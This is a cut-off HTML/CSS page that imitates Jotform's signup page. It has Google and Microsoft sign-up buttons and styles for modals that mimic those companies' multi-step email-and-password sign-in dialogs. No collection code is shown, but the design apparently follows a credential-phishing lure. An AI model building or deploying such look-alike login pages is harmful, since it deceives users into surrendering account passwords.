<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Multi‑step Google sign‑in</title>
  <!-- Bootstrap 5 CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <!-- Google Font: Inter + Roboto -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --jf-purple: #6c3bf4;
      --jf-orange: #ff6100;
      --jf-orange-bright: #ff6900;
      --jf-blue: #007bff;
      --jf-blue-bright: #0064e0;
      --jf-dark: #1a1a2e;
      --jf-dark-navy: #0c1b33;
      --jf-green: #5cb85c;
      --jf-green-light: #7ed321;
      --text-muted: #8a94a6;
      --border-light: #e8ecf3;
    }

    * { box-sizing: border-box; }
    html { scroll-behavior: smooth; }

    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #ffffff;
      color: var(--jf-dark);
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      overflow-x: hidden;
    }

    body.modal-open {
      overflow: hidden;
    }

    /* ===== NAVBAR ===== */
    .jf-navbar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 0.85rem 1.25rem;
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(10px);
      -webkit-backdrop-filter: blur(10px);
      position: sticky;
      top: 0;
      z-index: 999;
      border-bottom: 1px solid transparent;
      transition: border-color 0.3s, box-shadow 0.3s;
    }

    .jf-navbar.scrolled {
      border-bottom-color: var(--border-light);
      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.04);
    }

    .jf-logo {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      font-weight: 800;
      font-size: 1.35rem;
      color: var(--jf-dark);
      text-decoration: none;
      letter-spacing: -0.03em;
    }

    .jf-logo-icon {
      width: 34px;
      height: 34px;
      background: linear-gradient(135deg, #ff6100 0%, #6c3bf4 50%, #00c2ff 100%);
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 0.9rem;
      font-weight: 900;
      box-shadow: 0 4px 12px rgba(108, 59, 244, 0.3);
    }

    .jf-navbar .btn-signup {
      background: var(--jf-dark-navy);
      color: white;
      border: none;
      padding: 0.55rem 1.15rem;
      border-radius: 0.5rem;
      font-size: 0.85rem;
      font-weight: 700;
      text-decoration: none;
      transition: all 0.2s;
      white-space: nowrap;
      cursor: pointer;
    }

    .jf-navbar .btn-signup:hover {
      background: #0a1628;
      color: white;
      transform: translateY(-1px);
      box-shadow: 0 6px 16px rgba(12, 27, 51, 0.25);
    }

    .jf-navbar .menu-icon {
      font-size: 1.2rem;
      color: var(--jf-dark);
      cursor: pointer;
      padding: 0.35rem;
      border: none;
      background: transparent;
      border-radius: 0.5rem;
      transition: background 0.2s;
      line-height: 1;
    }

    .jf-navbar .menu-icon:hover {
      background: var(--border-light);
    }

    /* ===== MAIN SIGNUP SECTION ===== */
    .signup-hero {
      padding: 2rem 1.25rem 3rem;
      background: #ffffff;
      text-align: center;
      position: relative;
      overflow: hidden;
    }

    .signup-hero-inner {
      max-width: 1200px;
      margin: 0 auto;
      position: relative;
    }

    .signup-eyebrow-top {
      font-size: clamp(0.85rem, 2vw, 1rem);
      font-weight: 800;
      letter-spacing: 0.08em;
      text-transform: uppercase;
      color: var(--jf-orange);
      margin-bottom: 0.5rem;
    }

    .signup-main-title {
      font-size: clamp(1.75rem, 5vw, 3.25rem);
      font-weight: 900;
      color: var(--jf-dark-navy);
      letter-spacing: -0.035em;
      line-height: 1.1;
      margin-bottom: 1rem;
    }

    .signup-main-subtitle {
      font-size: clamp(0.95rem, 2vw, 1.15rem);
      color: #4a5568;
      line-height: 1.55;
      max-width: 720px;
      margin: 0 auto 2.25rem;
      font-weight: 400;
    }

    .signup-layout {
      display: grid;
      grid-template-columns: 1fr;
      gap: 1.75rem;
      align-items: center;
      max-width: 1050px;
      margin: 0 auto;
    }

    @media (min-width: 992px) {
      .signup-layout {
        grid-template-columns: 1fr 360px 1fr;
        gap: 2rem;
      }
    }

    .signup-card {
      background: #ffffff;
      border: 1px solid var(--border-light);
      border-radius: 1rem;
      padding: 1.75rem 1.5rem;
      box-shadow: 0 10px 40px -15px rgba(12, 27, 51, 0.12),
                  0 2px 8px -2px rgba(12, 27, 51, 0.04);
      max-width: 400px;
      width: 100%;
      margin: 0 auto;
    }

    .signup-card-buttons {
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }

    .btn-provider {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.75rem;
      width: 100%;
      padding: 0.9rem 1.25rem;
      border-radius: 0.5rem;
      font-size: 1rem;
      font-weight: 700;
      border: 2px solid transparent;
      cursor: pointer;
      transition: all 0.2s ease;
      font-family: inherit;
      line-height: 1.2;
      text-align: center;
    }

    .btn-provider:disabled {
      opacity: 0.85;
      cursor: wait;
    }

    .btn-provider .provider-icon {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 24px;
      height: 24px;
      flex-shrink: 0;
    }

    .btn-provider .provider-icon svg {
      width: 100%;
      height: 100%;
      display: block;
    }

    .btn-google {
      background: var(--jf-blue-bright);
      color: #ffffff;
      border-color: var(--jf-blue-bright);
    }

    .btn-google:hover {
      background: #0052b8;
      border-color: #0052b8;
      transform: translateY(-1px);
      box-shadow: 0 8px 20px -6px rgba(0, 100, 224, 0.5);
      color: #ffffff;
    }

    .btn-microsoft {
      background: #2f2f2f;
      color: #ffffff;
      border-color: #2f2f2f;
    }

    .btn-microsoft:hover {
      background: #1f1f1f;
      border-color: #1f1f1f;
      transform: translateY(-1px);
      box-shadow: 0 8px 20px -6px rgba(47, 47, 47, 0.5);
      color: #ffffff;
    }

    .signup-card-divider {
      display: flex;
      align-items: center;
      gap: 0.85rem;
      margin: 0.5rem 0;
      color: #b0b8c5;
      font-size: 0.75rem;
      font-weight: 700;
      letter-spacing: 0.1em;
    }

    .signup-card-divider::before,
    .signup-card-divider::after {
      content: '';
      flex: 1;
      height: 1px;
      background: #e0e4ec;
    }

    .btn-email {
      background: var(--jf-orange-bright);
      color: #ffffff;
      border-color: var(--jf-orange-bright);
    }

    .btn-email:hover {
      background: #e65c00;
      border-color: #e65c00;
      transform: translateY(-1px);
      box-shadow: 0 8px 20px -6px rgba(255, 105, 0, 0.55);
      color: #ffffff;
    }

    .signup-illustration {
      display: none;
      align-items: center;
      justify-content: center;
      position: relative;
    }

    @media (min-width: 992px) {
      .signup-illustration {
        display: flex;
      }
    }

    .illustration-svg {
      width: 100%;
      max-width: 320px;
      height: auto;
      display: block;
    }

    /* ===== RECOMMENDED FORMS ===== */
    .recommended-section {
      padding: 3rem 1.25rem 3rem;
      background: #f8f9fc;
    }

    .recommended-inner {
      max-width: 720px;
      margin: 0 auto;
    }

    .section-label {
      font-size: 0.75rem;
      font-weight: 700;
      letter-spacing: 0.08em;
      text-transform: uppercase;
      color: var(--text-muted);
      margin-bottom: 1rem;
      text-align: center;
    }

    .recommended-list {
      display: grid;
      grid-template-columns: 1fr;
      gap: 0.85rem;
    }

    .rec-card {
      display: flex;
      align-items: center;
      gap: 1rem;
      background: #ffffff;
      border-radius: 1rem;
      padding: 1.1rem 1.25rem;
      box-shadow: 0 4px 16px -6px rgba(0, 0, 0, 0.08),
                  0 0 0 1px rgba(0, 0, 0, 0.04);
      cursor: pointer;
      transition: all 0.2s ease;
      text-decoration: none;
      color: inherit;
    }

    .rec-card:hover {
      transform: translateY(-2px);
      box-shadow: 0 12px 28px -8px rgba(108, 59, 244, 0.2),
                  0 0 0 1.5px rgba(108, 59, 244, 0.25);
      color: inherit;
    }

    .rec-card .rec-icon {
      width: 46px;
      height: 46px;
      border-radius: 0.75rem;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.15rem;
      flex-shrink: 0;
    }

    .rec-card .rec-icon.consent {
      background: linear-gradient(135deg, #fff1e6, #ffe0cc);
      color: var(--jf-orange);
    }

    .rec-card .rec-icon.payment {
      background: linear-gradient(135deg, #e6f0ff, #cce0ff);
      color: var(--jf-blue);
    }

    .rec-card .rec-icon.registration {
      background: linear-gradient(135deg, #e6ffe6, #ccffcc);
      color: #34c759;
    }

    .rec-card .rec-icon.survey {
      background: linear-gradient(135deg, #f3e6ff, #e6ccff);
      color: var(--jf-purple);
    }

    .rec-card .rec-content {
      flex: 1;
      min-width: 0;
    }

    .rec-card .rec-title {
      font-size: 0.98rem;
      font-weight: 700;
      color: var(--jf-dark);
      margin-bottom: 0.15rem;
    }

    .rec-card .rec-desc {
      font-size: 0.84rem;
      color: var(--text-muted);
      margin: 0;
      line-height: 1.4;
    }

    .rec-card .rec-arrow {
      color: #c8cdd8;
      font-size: 0.85rem;
      flex-shrink: 0;
      transition: transform 0.2s;
    }

    .rec-card:hover .rec-arrow {
      color: var(--jf-purple);
      transform: translateX(3px);
    }

    .jf-footer {
      border-top: 1px solid var(--border-light);
      padding: 1.5rem 1.25rem;
      text-align: center;
      color: var(--text-muted);
      font-size: 0.82rem;
      max-width: 720px;
      margin: 0 auto;
      background: #ffffff;
    }

    /* ============================================================
       REAL-LIFE MODALS
       ============================================================ */
    .jf-modal-backdrop {
      position: fixed;
      inset: 0;
      background: rgba(15, 20, 35, 0.55);
      backdrop-filter: blur(4px);
      -webkit-backdrop-filter: blur(4px);
      z-index: 2000;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1rem;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.25s ease, visibility 0.25s ease;
    }

    .jf-modal-backdrop.active {
      opacity: 1;
      visibility: visible;
    }

    .jf-modal {
      background: #ffffff;
      border-radius: 0.75rem;
      width: 100%;
      max-width: 450px;
      box-shadow: 0 30px 80px -20px rgba(0, 0, 0, 0.4),
                  0 10px 30px -10px rgba(0, 0, 0, 0.2);
      transform: translateY(20px) scale(0.96);
      transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
      position: relative;
      max-height: calc(100vh - 2rem);
      overflow-y: auto;
    }

    .jf-modal-backdrop.active .jf-modal {
      transform: translateY(0) scale(1);
    }

    .jf-modal-close {
      position: absolute;
      top: 0.75rem;
      right: 0.75rem;
      width: 32px;
      height: 32px;
      border-radius: 50%;
      border: none;
      background: transparent;
      color: #5f6368;
      cursor: pointer;
      font-size: 1rem;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: background 0.2s;
      z-index: 10;
    }

    .jf-modal-close:hover {
      background: rgba(0, 0, 0, 0.06);
    }

    /* ===== GOOGLE MODAL (two-step) ===== */
    .google-modal {
      padding: 2.5rem 2rem 2rem;
      text-align: center;
      font-family: 'Roboto', 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
    }

    .google-modal-logo {
      width: 48px;
      height: 48px;
      margin: 0 auto 1rem;
    }

    .google-modal-title {
      font-size: 1.5rem;
      font-weight: 400;
      color: #202124;
      margin-bottom: 0.4rem;
      letter-spacing: -0.01em;
    }

    .google-modal-subtitle {
      font-size: 1rem;
      color: #202124;
      margin-bottom: 1.5rem;
      font-weight: 400;
    }

    .google-modal-input {
      width: 100%;
      padding: 0.85rem 1rem;
      border: 1px solid #dadce0;
      border-radius: 0.25rem;
      font-size: 1rem;
      font-family: 'Roboto', sans-serif;
      color: #202124;
      transition: border-color 0.2s, box-shadow 0.2s;
      outline: none;
      margin-bottom: 0.85rem;
    }

    .google-modal-input:focus {
      border-color: #1a73e8;
      box-shadow: 0 0 0 1px #1a73e8;
    }

    .google-modal-input::placeholder {
      color: #5f6368;
    }

    .google-modal-actions {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 1.5rem;
      flex-wrap: wrap;
      gap: 0.75rem;
    }

    .google-link {
      color: #1a73e8;
      font-size: 0.9rem;
      font-weight: 500;
      text-decoration: none;
      cursor: pointer;
      background: none;
      border: none;
      padding: 0;
      font-family: inherit;
    }

    .google-link:hover {
      text-decoration: underline;
    }

    .google-btn-primary {
      background: #1a73e8;
      color: white;
      border: none;
      padding: 0.7rem 1.75rem;
      border-radius: 0.25rem;
      font-size: 0.95rem;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.2s, box-shadow 0.2s;
      font-family: 'Roboto', sans-serif;
    }

    .google-btn-primary:hover {
      background: #1765cc;
      box-shadow: 0 2px 6px rgba(26, 115, 232, 0.4);
    }

    .google-btn-primary:disabled {
      opacity: 0.7;
      cursor: wait;
    }

    /* Google two-step helpers */
    .google-step {
      transition: opacity 0.2s ease;
    }

    .google-back-link {
      background: none;
      border: none;
      color: #1a73e8;
      font-size: 0.9rem;
      cursor: pointer;
      padding: 0;
      font-family: inherit;
      display: inline-flex;
      align-items: center;
      gap: 0.25rem;
      margin-bottom: 0.5rem;
      transition: color 0.2s;
    }

    .google-back-link:hover {
      color: #0d47a1;
      text-decoration: underline;
    }

    .google-user-email {
      font-weight: 500;
      color: #202124;
      font-size: 0.95rem;
      margin-bottom: 0.25rem;
      word-break: break-all;
    }

    /* ===== MICROSOFT MODAL (MULTI-STEP) ===== */
    .microsoft-modal {
      padding: 2.5rem 2.5rem 2rem;
      font-family: 'Segoe UI', 'Roboto', sans-serif;
    }

    .microsoft-modal-logo {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      margin-bottom: 1.5rem;
    }

    .microsoft-modal-logo-icon {
      display: grid;
      grid-template-columns: 1fr 1fr;
      grid-template-rows: 1fr 1fr;
      gap: 2px;
      width: 24px;
      height: 24px;
    }

    .microsoft-modal-logo-icon span {
      display: block;
      width: 100%;
      height: 100%;
    }

    .microsoft-modal-logo-icon span:nth-child(1) { background: #F25022; }
    .microsoft-modal-logo-icon span:nth-child(2) { background: #7FBA00; }
    .microsoft-modal-logo-icon span:nth-child(3) { background: #00A4EF; }
    .microsoft-modal-logo-icon span:nth-child(4) { background: #FFB900; }

    .microsoft-modal-logo-text {
      font-size: 1rem;
      color: #5e5e5e;
      font-weight: 600;
      letter-spacing: -0.01em;
    }

    .microsoft-modal-title {
      font-size: 1.5rem;
      font-weight: 600;
      color: #1b1b1b;
      margin-bottom: 1.5rem;
      letter-spacing: -0.02em;
    }

    .microsoft-modal-input {
      width: 100%;
      padding: 0.5rem 0;
      border: none;
      border-bottom: 1px solid #666;
      font-size: 1rem;
      color: #1b1b1b;
      transition: border-color 0.2s;
      outline: none;
      margin-bottom: 0.75rem;
      background: transparent;
      font-family: inherit;
    }

    .microsoft-modal-input:focus {
      border-bottom-color: #0067b8;
      border-bottom-width: 2px;
    }

    .microsoft-modal-input::placeholder {
      color: #666;
    }

    .microsoft-modal-helper {
      font-size: 0.85rem;
      color: #666;
      margin-bottom: 1rem;
      line-height: 1.4;
    }

    .microsoft-modal-helper a {
      color: #0067b8;
      text-decoration: none;
    }

    .microsoft-modal-helper a:hover {
      text-decoration: underline;
    }

    .microsoft-modal-actions {
      display: flex;
      justify-content: flex-end;
      margin-top: 1.5rem;
    }

    .microsoft-btn-primary {
      background: #0067b8;
      color: white;
      border: none;
      padding: 0.6rem 2.5rem;
      font-size: 0.95rem;
      font-weight: 400;
      cursor: pointer;
      transition: background 0.2s;
      font-family: inherit;
      min-width: 108px;
    }

    .microsoft-btn-primary:hover {
      background: #005da6;
    }

    .microsoft-btn-primary:disabled {
      opacity: 0.7;
      cursor: wait;
    }

    /* microsoft step specific */
    .microsoft-step {
      transition: opacity 0.2s ease;
    }

    .microsoft-step[data-step="2"] .microsoft-modal-input {
      margin-bottom: 0.25rem;
    }

    .microsoft-step[data-step="2"] .microsoft-modal-helper {
      margin-top: 0.5rem;
      margin-bottom: 0.5rem;
    }

    .microsoft-back-link {
      background: none;
      border: none;
      color: #0067b8;
      font-size: 0.9rem;
      cursor: pointer;
      padding: 0;
      font-family: inherit;
      display: inline-flex;
      align-items: center;
      gap: 0.25rem;
      margin-bottom: 0.5rem;
      transition: color 0.2s;
    }

    .microsoft-back-link:hover {
      color: #004578;
      text-decoration: underline;
    }

    .microsoft-user-email {
      font-weight: 600;
      color: #1b1b1b;
      font-size: 0.95rem;
      margin-bottom: 0.25rem;
      word-break: break-all;
    }

    /* ===== EMAIL MODAL ===== */
    .email-modal {
      padding: 2rem 2rem 1.75rem;
      font-family: 'Inter', sans-serif;
    }

    .email-modal-header {
      text-align: center;
      margin-bottom: 1.5rem;
    }

    .email-modal-icon {
      width: 56px;
      height: 56px;
      border-radius: 50%;
      background: linear-gradient(135deg, #6c3bf4, #8b5cf6);
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 1.5rem;
      margin: 0 auto 0.85rem;
      box-shadow: 0 8px 20px -6px rgba(108, 59, 244, 0.5);
    }

    .email-modal-title {
      font-size: 1.35rem;
      font-weight: 800;
      color: var(--jf-dark);
      margin-bottom: 0.35rem;
      letter-spacing: -0.02em;
    }

    .email-modal-subtitle {
      font-size: 0.88rem;
      color: var(--text-muted);
      margin: 0;
    }

    .email-form-label {
      display: block;
      font-size: 0.8rem;
      font-weight: 600;
      color: var(--jf-dark);
      margin-bottom: 0.35rem;
      margin-top: 0.85rem;
    }

    .email-form-input {
      width: 100%;
      padding: 0.75rem 1rem;
      border: 1.5px solid var(--border-light);
      border-radius: 0.5rem;
      font-size: 0.92rem;
      font-family: inherit;
      color: var(--jf-dark);
      transition: border-color 0.2s, box-shadow 0.2s;
      outline: none;
      background: #ffffff;
    }

    .email-form-input:focus {
      border-color: var(--jf-purple);
      box-shadow: 0 0 0 3px rgba(108, 59, 244, 0.12);
    }

    .email-form-input::placeholder {
      color: #a8b0bf;
    }

    .email-btn-submit {
      width: 100%;
      background: linear-gradient(135deg, #6c3bf4, #8b5cf6);
      color: white;
      border: none;
      padding: 0.85rem 1rem;
      border-radius: 0.5rem;
      font-size: 0.95rem;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.2s;
      margin-top: 1.25rem;
      font-family: inherit;
      box-shadow: 0 8px 20px -6px rgba(108, 59, 244, 0.5);
    }

    .email-btn-submit:hover {
      background: linear-gradient(135deg, #5a2de0, #7c4ce6);
      transform: translateY(-1px);
      box-shadow: 0 12px 25px -6px rgba(108, 59, 244, 0.65);
      color: white;
    }

    .email-btn-submit:disabled {
      opacity: 0.85;
      cursor: wait;
      transform: none;
    }

    .email-modal-divider {
      display: flex;
      align-items: center;
      gap: 0.75rem;
      margin: 1.25rem 0 1rem;
      color: #b0b8c5;
      font-size: 0.72rem;
      font-weight: 700;
      letter-spacing: 0.08em;
    }

    .email-modal-divider::before,
    .email-modal-divider::after {
      content: '';
      flex: 1;
      height: 1px;
      background: var(--border-light);
    }

    .email-modal-socials {
      display: flex;
      gap: 0.6rem;
    }

    .email-social-btn {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
      padding: 0.65rem 0.75rem;
      border: 1.5px solid var(--border-light);
      border-radius: 0.5rem;
      background: #ffffff;
      font-size: 0.82rem;
      font-weight: 600;
      color: var(--jf-dark);
      cursor: pointer;
      transition: all 0.2s;
      font-family: inherit;
    }

    .email-social-btn:hover {
      border-color: var(--jf-purple);
      background: rgba(108, 59, 244, 0.04);
      color: var(--jf-purple);
    }

    .email-modal-footer {
      text-align: center;
      font-size: 0.82rem;
      color: var(--text-muted);
      margin-top: 1.35rem;
      margin-bottom: 0;
    }

    .email-modal-footer a {
      color: var(--jf-purple);
      text-decoration: none;
      font-weight: 600;
      cursor: pointer;
    }

    .email-modal-footer a:hover {
      text-decoration: underline;
    }

    @media (max-width: 480px) {
      .google-modal { padding: 2rem 1.5rem 1.5rem; }
      .microsoft-modal { padding: 2rem 1.5rem 1.5rem; }
      .email-modal { padding: 1.75rem 1.5rem 1.5rem; }
      .google-modal-title,
      .microsoft-modal-title { font-size: 1.3rem; }
    }

    /* ===== RESPONSIVE ===== */
    @media (min-width: 576px) {
      .jf-navbar { padding: 0.9rem 2rem; }
      .signup-hero { padding: 2.5rem 2rem 3.5rem; }
      .recommended-section { padding: 3rem 2rem 3.5rem; }
      .signup-card { padding: 2rem 1.75rem; }
    }

    @media (min-width: 768px) {
      .jf-navbar { padding: 0.9rem 3rem; }
      .signup-hero { padding: 3rem 3rem 4rem; }
      .recommended-section { padding: 3.5rem 3rem 4rem; }
      .signup-card { padding: 2rem; }
    }

    @media (min-width: 992px) {
      .jf-navbar { padding: 1rem 4rem; }
      .signup-hero { padding: 3.5rem 4rem 4.5rem; }
      .recommended-section { padding: 4rem 4rem 4.5rem; }
      .recommended-list {
        grid-template-columns: 1fr 1fr;
        gap: 1rem;
      }
    }

    @media (min-width: 1200px) {
      .jf-navbar { padding: 1rem 5rem; }
      .signup-hero { padding: 4rem 5rem 5rem; }
      .recommended-section { padding: 4.5rem 5rem 5rem; }
    }

    button:focus-visible, a:focus-visible {
      outline: 3px solid #ff6900;
      outline-offset: 3px;
    }

    .rec-card:focus { outline: none; }
    .rec-card:focus-visible {
      outline: 2px solid var(--jf-purple);
      outline-offset: 2px;
    }

    @keyframes successPulse {
      0%   { transform: scale(1); }
      50%  { transform: scale(1.02); }
      100% { transform: scale(1); }
    }

    .btn-provider.success {
      animation: successPulse 0.4s ease;
    }
  </style>
</head>
<body>

  <!-- ===== NAVBAR ===== -->
  <nav class="jf-navbar" id="navbar">
    <a href="#" class="jf-logo">
      <span class="jf-logo-icon"><i class="fas fa-bolt"></i></span>
      <span>Jotform</span>
    </a>
    <div class="d-flex align-items-center gap-3">
      <button class="btn-signup" id="navSignupBtn" type="button">Sign Up for Free</button>
      <button class="menu-icon" aria-label="Open menu">
        <i class="fas fa-bars"></i>
      </button>
    </div>
  </nav>

  <!-- ===== MAIN SIGNUP HERO ===== -->
  <section class="signup-hero">
    <div class="signup-hero-inner">

      <div class="signup-eyebrow-top">Easiest online form builder</div>
      <h1 class="signup-main-title">Powerful forms get it done.</h1>
      <p class="signup-main-subtitle">
        Go from busywork to less work with powerful forms that use conditional logic, accept payments, generate reports, and automate workflows.
      </p>

      <div class="signup-layout">

        <!-- LEFT ILLUSTRATION -->
        <div class="signup-illustration">
          <svg class="illustration-svg" viewBox="0 0 320 240" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
            <path d="M20 60 Q40 20 110 20 L260 20 Q300 20 310 70 L310 180 Q300 220 240 220 L60 220 Q20 220 20 170 Z" fill="#1E88E5"/>
            <path d="M0 90 Q20 50 80 45 L240 45 Q300 50 300 110 L300 200 Q280 240 200 240 L60 240 Q0 235 0 180 Z" fill="#42A5F5"/>
            <ellipse cx="120" cy="180" rx="100" ry="60" fill="#90CAF9" opacity="0.5"/>
            <ellipse cx="105" cy="200" rx="55" ry="45" fill="#8BC34A"/>
            <path d="M60 160 Q70 130 110 130 Q150 130 160 160 L160 200 L60 200 Z" fill="#7CB342"/>
            <circle cx="110" cy="115" r="30" fill="#FFCC80"/>
            <path d="M80 115 Q80 85 110 85 Q140 85 140 115 Q140 100 110 100 Q80 100 80 115 Z" fill="#2C3E50"/>
            <path d="M82 110 Q82 80 110 80 Q138 80 138 110 L140 130 Q135 135 130 130 Q130 120 128 115 Q120 105 110 105 Q100 105 92 115 Q90 120 90 130 Q85 135 80 130 Z" fill="#1A1A2E"/>
            <path d="M82 105 Q85 85 110 82 Q130 82 138 100 L135 108 Q125 92 110 90 Q90 92 85 108 Z" fill="#E91E63"/>
            <circle cx="100" cy="115" r="2" fill="#1A1A2E"/>
            <circle cx="120" cy="115" r="2" fill="#1A1A2E"/>
            <path d="M100 125 Q110 132 120 125" stroke="#C62828" stroke-width="2" stroke-linecap="round" fill="none"/>
            <circle cx="90" cy="122" r="4" fill="#FFAB91" opacity="0.7"/>
            <circle cx="130" cy="122" r="4" fill="#FFAB91" opacity="0.7"/>
            <path d="M155 165 Q180 175 200 190 Q205 195 200 200 Q195 200 190 197 L165 185 Z" fill="#FFCC80"/>
            <rect x="175" y="150" width="90" height="55" rx="4" fill="#FFFFFF" stroke="#1A1A2E" stroke-width="2"/>
            <rect x="180" y="155" width="80" height="45" rx="2" fill="#F5F5F5"/>
            <text x="220" y="170" font-family="Inter, sans-serif" font-size="5" font-weight="700" fill="#1A1A2E" text-anchor="middle">New Submission</text>
            <rect x="190" y="176" width="60" height="4" rx="2" fill="#42A5F5"/>
            <rect x="190" y="184" width="60" height="4" rx="2" fill="#FFB300"/>
            <rect x="190" y="192" width="40" height="4" rx="2" fill="#66BB6A"/>
          </svg>
        </div>

        <!-- CENTER: SIGN UP CARD -->
        <div class="signup-card">
          <div class="signup-card-buttons">

            <button class="btn-provider btn-google" data-provider="google" type="button">
              <span class="provider-icon">
                <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                  <path fill="#FFC107" d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 12.955 4 4 12.955 4 24s8.955 20 20 20 20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z"/>
                  <path fill="#FF3D00" d="m6.306 14.691 6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 16.318 4 9.656 8.337 6.306 14.691z"/>
                  <path fill="#4CAF50" d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238A11.91 11.91 0 0 1 24 36c-5.202 0-9.619-3.317-11.283-7.946l-6.522 5.025C9.505 39.556 16.227 44 24 44z"/>
                  <path fill="#1976D2" d="M43.611 20.083H42V20H24v8h11.303a12.04 12.04 0 0 1-4.087 5.571l.003-.002 6.19 5.238C36.971 39.205 44 34 44 24c0-1.341-.138-2.65-.389-3.917z"/>
                </svg>
              </span>
              <span>Sign Up with Google</span>
            </button>

            <button class="btn-provider btn-microsoft" data-provider="microsoft" type="button">
              <span class="provider-icon">
                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                  <rect x="0" y="0" width="11" height="11" fill="#F25022"/>
                  <rect x="13" y="0" width="11" height="11" fill="#7FBA00"/>
                  <rect x="0" y="13" width="11" height="11" fill="#00A4EF"/>
                  <rect x="13" y="13" width="11" height="11" fill="#FFB900"/>
                </svg>
              </span>
              <span>Sign Up with Microsoft</span>
            </button>

            <div class="signup-card-divider">OR</div>

            <button class="btn-provider btn-email" data-provider="email" type="button">
              <span class="provider-icon" style="font-size: 1rem; color: #ffffff;">
                <i class="fas fa-envelope"></i>
              </span>
              <span>Sign Up with an email</span>
            </button>

          </div>
        </div>

        <!-- RIGHT ILLUSTRATION -->
        <div class="signup-illustration">
          <svg class="illustration-svg" viewBox="0 0 320 240" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
            <path d="M30 80 Q40 30 120 30 L280 30 Q320 50 310 120 L310 200 Q300 240 220 240 L60 240 Q20 220 30 160 Z" fill="#FFC107"/>
            <path d="M20 100 Q30 40 100 40 L270 40 Q310 60 300 130 L300 210 Q290 250 210 250 L50 250 Q10 230 20 170 Z" fill="#FFD54F"/>
            <circle cx="90" cy="65" r="30" fill="#66BB6A"/>
            <path d="M78 65 L88 75 L104 58" stroke="#FFFFFF" stroke-width="5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
            <g transform="translate(230, 180)">
              <ellipse cx="0" cy="0" rx="28" ry="24" fill="#FFB74D"/>
              <ellipse cx="-18" cy="-20" rx="8" ry="10" fill="#FFB74D"/>
              <ellipse cx="18" cy="-20" rx="8" ry="10" fill="#FFB74D"/>
              <ellipse cx="-18" cy="-20" rx="4" ry="5" fill="#FF8F00"/>
              <ellipse cx="18" cy="-20" rx="4" ry="5" fill="#FF8F00"/>
              <circle cx="-9" cy="-3" r="3" fill="#1A1A2E"/>
              <circle cx="9" cy="-3" r="3" fill="#1A1A2E"/>
              <path d="M-4 8 Q0 12 4 8" stroke="#1A1A2E" stroke-width="2" fill="none" stroke-linecap="round"/>
            </g>
            <ellipse cx="215" cy="195" rx="55" ry="45" fill="#3F51B5"/>
            <path d="M170 155 Q180 125 220 125 Q260 125 270 155 L270 195 L170 195 Z" fill="#3949AB"/>
            <circle cx="220" cy="115" r="28" fill="#8D5524"/>
            <path d="M192 115 Q192 85 220 85 Q248 85 248 115 Q248 105 220 105 Q192 105 192 115 Z" fill="#1A1A2E"/>
            <path d="M194 108 Q194 82 220 82 Q246 82 246 108 L246 118 Q240 110 220 110 Q200 110 194 118 Z" fill="#1A1A2E"/>
            <circle cx="210" cy="115" r="2" fill="#1A1A2E"/>
            <circle cx="230" cy="115" r="2" fill="#1A1A2E"/>
            <path d="M212 124 Q220 130 228 124" stroke="#6D2F1F" stroke-width="2" stroke-linecap="round" fill="none"/>
            <circle cx="200" cy="122" r="4" fill="#D4785E" opacity="0.6"/>
            <circle cx="240" cy="122" r="4" fill="#D4785E" opacity="0.6"/>
            <path d="M200 145 Q220 138 240 145 L250 175 L190 175 Z" fill="#FFFFFF"/>
            <path d="M270 165 Q285 175 290 185 Q292 192 285 195 Q280 192 275 187 L265 178 Z" fill="#8D5524"/>
            <rect x="240" y="160" width="80" height="50" rx="4" fill="#E0E0E0" stroke="#1A1A2E" stroke-width="2"/>
            <rect x="245" y="165" width="70" height="40" rx="2" fill="#FFFFFF"/>
